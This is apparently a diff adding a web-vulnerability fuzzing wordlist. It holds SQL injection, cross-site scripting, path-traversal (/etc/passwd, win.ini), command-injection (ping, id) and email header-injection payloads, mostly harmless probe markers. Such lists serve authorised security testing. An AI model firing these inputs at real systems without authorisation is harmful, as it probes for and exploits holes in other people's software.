@@ -1,0 +1,44 @@
+'
+'--
+' or 1=1--
+1 or 1=1--
+' or 1 in (@@version)--
+1 or 1 in (@@version)--
+'; waitfor delay '0:30:0'--
+1; waitfor delay '0:30:0'--
+'||Utl_Http.request('http://www.google.com') from dual--
+1||Utl_Http.request('http://www.google.com') from dual--
+abrupt_xss__
+abrupt_xss__%00"<>'
+</b>
+<b>abrupt</b>
+<script>alert(1)</script>
+))))))))))
+../../../../../../../../../../etc/passwd
+../../../../../../../../../../boot.ini
+..\..\..\..\..\..\..\..\..\..\etc\passwd
+..\..\..\..\..\..\..\..\..\..\boot.ini
+../../../../../../../../../../windows/win.ini
+..\..\..\..\..\..\..\..\..\..\windows\win.ini
+|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &
+| ping -i 30 127.0.0.1 |
+| ping -n 30 127.0.0.1 |
+& ping -i 30 127.0.0.1 &
+& ping -n 30 127.0.0.1 &
+; ping 127.0.0.1 ;
+%0a ping -i 30 127.0.0.1 %0a
+`ping 127.0.0.1`
+| id
+& id
+; id
+%0a id %0a
+`id`
+;echo 0123456789
+echo 0123456789
+response.write 0123456789
+:response.write 0123456789
+http://www.google.com/
+test0@trashmemail.com%0aCc:test@trashmemail.com
+test0@trashmemail.com%0a%0dCc:test@trashmemail.com
+test0@trashmemail.com%0aBCc:test@trashmemail.com
+test0@trashmemail.com%0a%0dBCc:test@trashmemail.com
